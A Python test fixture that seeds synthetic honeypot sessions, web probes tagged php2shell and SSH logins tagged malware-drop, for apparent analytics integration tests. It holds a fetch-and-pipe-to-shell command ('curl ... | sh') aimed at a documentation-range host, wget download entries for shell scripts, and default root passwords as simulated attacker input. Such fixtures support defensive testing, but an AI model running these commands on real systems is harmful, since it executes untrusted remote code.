"""Seeds for the M7 integration tests (documentation IP ranges only)."""

from datetime import datetime, timedelta

from analytics_seed import Seed, login

CMD = "curl -s http://192.0.2.50/x | sh"
DO = ("NL", "Amsterdam", 14061, "DigitalOcean, LLC")
CLOUD = ("US", "Ashburn", 15169, "Example Cloud")


def m7_dataset(now: datetime) -> Seed:
    """Hand-checked data for a default 7 day window ending at ``now``.

    current window:  30 php2shell web sessions, 12 malware-drop ssh sessions (login success,
                     one download and one never-seen command each)
    previous window: 10 php2shell web sessions, 3 ssh sessions with a successful login
    """
    seed = Seed()
    for i in range(30):
        seed.session(
            f"cw{i}",
            "web",
            f"203.0.113.{i + 1}",
            now - timedelta(days=1, minutes=i),
            [
                (0.0, "connect", {}),
                (1.0, "http_request", {"path": "/index.php", "user_agent": "bot/1"}),
            ],
            tags=["php2shell"],
            geo=CLOUD,
        )
    for i in range(12):
        seed.session(
            f"cs{i}",
            "ssh",
            f"198.51.100.{i + 1}",
            now - timedelta(days=2, minutes=i),
            [
                (0.0, "connect", {}),
                login("root", "admin", True),
                (3.0, "command", {"input": CMD}),
                (
                    4.0,
                    "download_attempt",
                    {"url": f"http://192.0.2.50/m{i % 3}.sh", "tool": "wget"},
                ),
            ],
            tags=["malware-drop"],
            geo=DO,
            success=True,
        )
    for i in range(10):
        seed.session(
            f"pw{i}",
            "web",
            f"203.0.113.{i + 1}",
            now - timedelta(days=9, minutes=i),
            [(0.0, "connect", {}), (1.0, "http_request", {"path": "/", "user_agent": "bot/0"})],
            tags=["php2shell"],
            geo=CLOUD,
        )
    for i in range(3):
        seed.session(
            f"ps{i}",
            "ssh",
            f"198.51.100.{i + 100}",
            now - timedelta(days=10, minutes=i),
            [
                (0.0, "connect", {}),
                login("root", "toor", True),
                (3.0, "command", {"input": "uname -a"}),
            ],
            geo=DO,
            success=True,
        )
    return seed
